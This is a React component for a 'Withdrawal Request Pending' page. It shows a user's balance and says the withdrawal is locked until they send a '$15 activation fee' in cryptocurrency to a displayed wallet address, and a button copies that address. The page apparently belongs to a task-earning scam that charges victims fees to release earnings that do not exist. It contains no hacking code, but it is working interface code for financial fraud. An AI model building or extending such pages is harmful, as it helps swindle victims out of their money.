import { Alert, Box, Button, Paper, Stack, Typography } from "@mui/material";
import PendingActionsIcon from "@mui/icons-material/PendingActions";
import { withdrawStore } from "./withdrawStore";
import { toast } from "react-toastify";
import { useNavigate } from "react-router-dom";

export default function WithdrawalLocked() {
  
const navigate = useNavigate();
const walletName = withdrawStore((state) => state.walletName);
const amount = withdrawStore((state) => state.amount);
const activateWalletAddress = withdrawStore(
  (state) => state.activateWalletAddress,
);

const handleCopy = async () => {
 await navigator.clipboard.writeText(activateWalletAddress);
 toast.success("Wallet Copied!");
};

return (
  <Box
    display="flex"
    justifyContent="center"
    alignItems="center"
    minHeight="80vh"
    p={2}
  >
    <Paper
      elevation={4}
      sx={{
        maxWidth: 600,
        width: "100%",
        p: 4,
        borderRadius: 4,
      }}
    >
      <Stack spacing={3} alignItems="center">
        <PendingActionsIcon color="warning" sx={{ fontSize: 80 }} />

        <Typography variant="h4" fontWeight="bold" textAlign="center">
          Withdrawal Request Pending
        </Typography>

        <Typography variant="h3" color="success.main" fontWeight="bold">
          {Number(amount).toLocaleString("en-US", {
            style: "currency",
            currency: "USD",
          })}
        </Typography>

        <Paper
          variant="outlined"
          sx={{
            width: "100%",
            p: 3,
            borderRadius: 3,
          }}
        >
          <Stack spacing={2}>
            <Stack direction="row" justifyContent="space-between">
              <Typography color="text.secondary">Status</Typography>

              <Typography fontWeight="bold" color="warning.main">
                Pending
              </Typography>
            </Stack>

            <Stack direction="row" justifyContent="space-between">
              <Typography color="text.secondary">Withdrawal Method</Typography>

              <Typography fontWeight="bold">{walletName}</Typography>
            </Stack>

            <Stack direction="row" justifyContent="space-between">
              <Typography color="text.secondary">Requirement</Typography>

              <Typography fontWeight="bold">
                Account Verification Required
              </Typography>
            </Stack>
          </Stack>
        </Paper>

        <Typography variant="body1" color="text.secondary" textAlign="center">
          Your account is active and you can continue completing tasks normally.
          However, your withdrawal request cannot be processed until your
          account verification is completed.
        </Typography>

        <Alert severity="info" sx={{ width: "100%" }}>
          To complete verification, send <strong>$15</strong> activation fee in{" "}
          <strong>{walletName}</strong> to the wallet address below.
        </Alert>

        <Alert severity="info" sx={{ width: "100%" }}>
          {activateWalletAddress}
        </Alert>

        <Typography variant="body2" color="text.secondary" textAlign="center">
          After verification is confirmed, withdrawals will be enabled on your
          account and future withdrawal requests can be processed normally.
        </Typography>

        <Button
          onClick={handleCopy}
          variant="contained"
          color="success"
          size="large"
          fullWidth
        >
          Copy {walletName} Wallet Address
        </Button>

        <Stack
          direction="row"
          spacing={1}
          justifyContent="center"
          alignItems="center"
        >
          <Typography variant="body2">Need Help? Contact Support</Typography>

          <Button
            onClick={() => navigate("/admin/support")}
            color="success"
            size="small"
          >
            Support
          </Button>
        </Stack>
      </Stack>
    </Paper>
  </Box>
);
}
